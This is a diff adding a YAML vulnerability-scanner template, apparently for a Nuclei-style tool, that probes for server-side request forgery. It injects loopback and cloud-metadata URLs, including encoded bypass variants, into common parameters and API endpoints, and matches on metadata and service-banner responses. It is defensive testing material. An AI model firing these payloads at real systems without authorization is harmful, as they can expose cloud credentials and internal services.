@@ -1,0 +1,103 @@
+id: ssrf-probe
+info:
+  name: Server-Side Request Forgery (SSRF)
+  severity: High
+  description: |
+    检测服务端请求伪造漏洞，通过注入内部URL尝试让服务器发起请求到内网资源。
+    覆盖多种注入点和绕过方式。
+  tags:
+    - ssrf
+    - injection
+    - server-side
+  reference:
+    - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url={{payload}}"
+      - "{{BaseURL}}/?redirect={{payload}}"
+      - "{{BaseURL}}/?next={{payload}}"
+      - "{{BaseURL}}/?link={{payload}}"
+      - "{{BaseURL}}/?src={{payload}}"
+      - "{{BaseURL}}/?dest={{payload}}"
+      - "{{BaseURL}}/?target={{payload}}"
+      - "{{BaseURL}}/?rurl={{payload}}"
+      - "{{BaseURL}}/?return={{payload}}"
+      - "{{BaseURL}}/?fetch={{payload}}"
+      - "{{BaseURL}}/?proxy={{payload}}"
+      - "{{BaseURL}}/?path={{payload}}"
+      - "{{BaseURL}}/?site={{payload}}"
+      - "{{BaseURL}}/?reference={{payload}}"
+      - "{{BaseURL}}/?goto={{payload}}"
+    payload_sets:
+      default:
+        - "http://127.0.0.1:80"
+        - "http://localhost:80"
+        - "http://[::1]:80"
+        - "http://127.0.0.1:22"
+        - "http://127.0.0.1:443"
+        - "http://127.0.0.1:3306"
+        - "http://169.254.169.254/latest/meta-data/"
+        - "http://169.254.169.254/latest/user-data/"
+        - "http://169.254.169.254/openstack/latest/meta_data.json"
+        - "http://metadata.google.internal/computeMetadata/v1/"
+      bypass:
+        - "http://0x7f000001:80"
+        - "http://0177.0.0.1:80"
+        - "http://0.0.0.0:80"
+        - "http://127.1:80"
+        - "http://127.0.0.1:80%23.aegis-test.com"
+        - "http://127.0.0.1:80%00.aegis-test.com"
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "reservation-id"
+          - "ami-launch-index"
+          - "hostname"
+          - "local-ipv4"
+          - "public-ipv4"
+          - "meta-data"
+          - "user-data"
+          - "computeMetadata"
+          - "SSH-2.0-"
+          - "mysql_native_password"
+          - "HTTP/1.1 200"
+        condition: or
+        part: body
+      - type: regex
+        regex:
+          - "ami-[a-z0-9]+"
+          - "i-[a-f0-9]+"
+          - "r-[a-f0-9]+"
+        part: body
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/fetch"
+      - "{{BaseURL}}/api/proxy"
+      - "{{BaseURL}}/api/url"
+      - "{{BaseURL}}/api/request"
+      - "{{BaseURL}}/webhook"
+      - "{{BaseURL}}/callback"
+    headers:
+      Content-Type: "application/json"
+    body: '{"url": "{{payload}}"}'
+    payload_sets:
+      default:
+        - "http://127.0.0.1:80"
+        - "http://169.254.169.254/latest/meta-data/"
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "meta-data"
+          - "computeMetadata"
+          - "SSH-2.0-"
+        condition: or
+        part: body
